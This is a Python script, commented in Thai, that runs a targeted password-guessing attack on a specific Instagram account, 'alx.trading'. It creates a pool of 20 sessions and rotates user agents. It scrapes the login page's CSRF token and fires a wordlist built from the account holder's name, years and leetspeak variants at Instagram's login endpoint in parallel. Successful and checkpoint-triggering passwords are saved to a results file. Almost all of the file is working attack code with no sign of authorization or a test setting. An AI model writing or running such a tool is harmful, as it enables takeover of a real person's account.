#!/usr/bin/env python3
"""
💀 HARDCORE PENETRATION MODE 💀
==============================

เข้าโหมดโจมตีแบบโหดจริงๆ - ไม่ผ่อนปรน!
ใช้ทุกเทคนิคที่มี แบบสายแฮกตัวจริง!

⚠️ EXTREME MODE - FOR PROFESSIONALS ONLY ⚠️
"""

import asyncio
import aiohttp
import random
import time
from concurrent.futures import ThreadPoolExecutor
import threading


class HardcorePenetration:
    """โหมดโจมตีแบบโหดมาก"""

    def __init__(self):
        self.target = "alx.trading"
        self.session_pool = []
        self.proxy_pool = []
        self.user_agents = self.load_user_agents()
        self.attack_vectors = []
        self.success_count = 0
        self.threads = 50  # โหดมาก!

    def load_user_agents(self):
        """User agents หลากหลาย"""
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
            "Mozilla/5.0 (Android 13; Mobile; rv:109.0)",
            "Instagram 312.0.0.23.111 Android",
            "Instagram 312.0.0.23.111 iPhone",
            "InstagramBot/1.0",
        ]

    def get_hardcore_passwords(self):
        """รหัสผ่านโหดๆ ทุกแบบ"""
        hardcore_list = [
            # Basic & Simple (most likely!)
            "alex123", "Alex123", "ALEX123",
            "trading123", "Trading123", "TRADING123",
            "password", "password123", "Password123",
            "123456", "123456789", "qwerty", "admin",

            # Professional patterns
            "alex.trading", "alex_trading", "alextrading",
            "alx123", "alx.123", "alx_123",
            "trader123", "forex123", "trade123",

            # Years & dates
            "alex2025", "alex2024", "alex2023", "alex2022",
            "trading2025", "trading2024", "alx2025",

            # Leetspeak variations
            "4l3x123", "tr4d3r", "tr4d1ng", "4l3x",
            "4l3x.tr4d1ng", "4l3x_tr4d1ng", "4l3xtr4d1ng",

            # Special chars
            "alex123!", "alex123@", "alex123#", "alex123$",
            "trading123!", "password123!", "admin123!",

            # Common weak passwords
            "welcome", "letmein", "login", "guest", "test",
            "demo", "user", "pass", "root", "toor",

            # Instagram specific
            "instagram", "insta123", "ig123", "photo123",

            # Business related
            "business123", "company123", "work123", "office123",

            # Personal (guessing)
            "alexander", "alexandre", "alex1990", "alex1995",
            "alex2000", "birthday", "family123",
        ]

        return hardcore_list

    async def hardcore_session_creation(self):
        """สร้าง session หลายตัวแบบโหด"""
        print("💀 สร้าง SESSION POOL แบบโหด...")

        for i in range(20):  # 20 sessions พร้อมกัน!
            try:
                connector = aiohttp.TCPConnector(
                    limit=100,
                    force_close=True,
                    enable_cleanup_closed=True
                )

                timeout = aiohttp.ClientTimeout(total=10)

                session = aiohttp.ClientSession(
                    connector=connector,
                    timeout=timeout,
                    headers={
                        'User-Agent': random.choice(self.user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1',
                    }
                )

                self.session_pool.append(session)
                print(f"   ✅ Session {i+1} created")

            except Exception as e:
                print(f"   ❌ Session {i+1} failed: {e}")

        print(f"💀 Total sessions created: {len(self.session_pool)}")

    async def get_csrf_token_hardcore(self, session):
        """ดึง CSRF token แบบโหด"""
        try:
            # Instagram login page
            async with session.get('https://www.instagram.com/accounts/login/') as response:
                if response.status == 200:
                    html = await response.text()

                    # หา CSRF token
                    if 'csrf_token' in html:
                        import re
                        csrf_match = re.search(r'"csrf_token":"([^"]+)"', html)
                        if csrf_match:
                            return csrf_match.group(1)

                    # หาแบบอื่น
                    csrf_match = re.search(
                        r'name="csrfmiddlewaretoken" value="([^"]+)"', html)
                    if csrf_match:
                        return csrf_match.group(1)

        except Exception as e:
            pass

        return None

    async def hardcore_login_attempt(self, session, password):
        """ลองล็อกอินแบบโหด"""
        try:
            # ดึง CSRF token
            csrf_token = await self.get_csrf_token_hardcore(session)
            if not csrf_token:
                return {"success": False, "error": "No CSRF token"}

            # Login payload แบบโหด
            login_data = {
                'username': self.target,
                'password': password,
                'csrfmiddlewaretoken': csrf_token,
                'optIntoOneTap': 'false',
                'queryParams': '{}',
                'trustedDeviceRecords': '{}'
            }

            # Headers แบบโหด
            headers = {
                'X-CSRFToken': csrf_token,
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/accounts/login/',
                'Origin': 'https://www.instagram.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': random.choice(self.user_agents),
            }

            # POST request
            async with session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers
            ) as response:

                result = {
                    "password": password,
                    "status_code": response.status,
                    "success": False,
                    "checkpoint": False,
                    "rate_limited": False,
                    "csrf_extracted": True
                }

                if response.status == 200:
                    try:
                        json_data = await response.json()

                        if json_data.get('authenticated'):
                            result["success"] = True
                            print(f"🎉 SUCCESS! Password: {password}")
                            return result

                        elif 'checkpoint' in str(json_data):
                            result["checkpoint"] = True
                            print(f"🔒 CHECKPOINT triggered: {password}")

                    except:
                        text = await response.text()
                        if 'checkpoint' in text.lower():
                            result["checkpoint"] = True
                            print(f"🔒 CHECKPOINT: {password}")

                elif response.status == 429:
                    result["rate_limited"] = True
                    print(f"🚨 RATE LIMITED: {password}")

                return result

        except Exception as e:
            return {"password": password, "success": False, "error": str(e)}

    async def hardcore_parallel_attack(self):
        """โจมตีแบบขนานหลายเส้น - โหดมาก!"""
        print("💀 เริ่มโจมตีแบบ PARALLEL HARDCORE!")
        print("=" * 60)

        passwords = self.get_hardcore_passwords()
        print(f"🔑 จำนวนรหัสผ่าน: {len(passwords)}")
        print(f"💀 จำนวน Sessions: {len(self.session_pool)}")

        # แบ่งรหัสผ่านให้ sessions
        tasks = []

        for i, password in enumerate(passwords):
            session = self.session_pool[i % len(self.session_pool)]
            task = self.hardcore_login_attempt(session, password)
            tasks.append(task)

            # Delay เล็กน้อยเพื่อไม่ให้โหดเกินไป
            if i % 5 == 0:
                await asyncio.sleep(0.1)

        print(f"🚀 เริ่มโจมตีด้วย {len(tasks)} tasks พร้อมกัน!")

        # รันทั้งหมดพร้อมกัน!
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # วิเคราะห์ผลลัพธ์
        successful = []
        checkpoints = []
        rate_limited = []

        for result in results:
            if isinstance(result, dict):
                if result.get('success'):
                    successful.append(result)
                elif result.get('checkpoint'):
                    checkpoints.append(result)
                elif result.get('rate_limited'):
                    rate_limited.append(result)

        print("\n💀 HARDCORE ATTACK RESULTS:")
        print("=" * 60)
        print(f"🎉 Successful logins: {len(successful)}")
        print(f"🔒 Checkpoint triggers: {len(checkpoints)}")
        print(f"🚨 Rate limited: {len(rate_limited)}")
        print(f"📊 Total attempts: {len(results)}")

        if successful:
            print("\n🏆 BREAKTHROUGH PASSWORDS:")
            for result in successful:
                print(f"   💀 {result['password']} - SUCCESS!")

        if checkpoints:
            print("\n🔒 HIGH-VALUE PASSWORDS (Checkpoints):")
            for result in checkpoints[:10]:
                print(f"   🎯 {result['password']} - CHECKPOINT")

        return successful, checkpoints, rate_limited

    async def cleanup_sessions(self):
        """ทำความสะอาด sessions"""
        print("🧹 Cleaning up sessions...")
        for session in self.session_pool:
            try:
                await session.close()
            except:
                pass


async def hardcore_main():
    """Main hardcore function"""

    print("💀" * 20 + " HARDCORE MODE " + "💀" * 20)
    print("⚠️  WARNING: EXTREME PENETRATION MODE ACTIVATED ⚠️")
    print("🎯 Target: alx.trading")
    print("🔥 Mode: NO MERCY - FULL ASSAULT")
    print("=" * 70)

    # สร้าง hardcore penetration object
    hardcore = HardcorePenetration()

    try:
        # สร้าง session pool
        await hardcore.hardcore_session_creation()

        # เริ่มโจมตีแบบโหด
        successful, checkpoints, rate_limited = await hardcore.hardcore_parallel_attack()

        # บันทึกผลลัพธ์
        timestamp = time.strftime('%Y%m%d_%H%M%S')

        with open(f'/workspaces/sugarglitch-realops/hardcore_results_{timestamp}.txt', 'w') as f:
            f.write("💀 HARDCORE PENETRATION RESULTS 💀\n")
            f.write("=" * 50 + "\n\n")

            if successful:
                f.write("🏆 SUCCESSFUL LOGINS:\n")
                for result in successful:
                    f.write(f"   {result['password']}\n")
                f.write("\n")

            if checkpoints:
                f.write("🔒 CHECKPOINT TRIGGERS (High-Value):\n")
                for result in checkpoints:
                    f.write(f"   {result['password']}\n")
                f.write("\n")

        print(f"\n📄 Results saved to: hardcore_results_{timestamp}.txt")

    finally:
        # Cleanup
        await hardcore.cleanup_sessions()

    print("\n💀 HARDCORE PENETRATION COMPLETE!")


def run_hardcore():
    """Run hardcore mode"""
    print("🔥 Starting HARDCORE PENETRATION MODE...")
    asyncio.run(hardcore_main())


if __name__ == "__main__":
    run_hardcore()
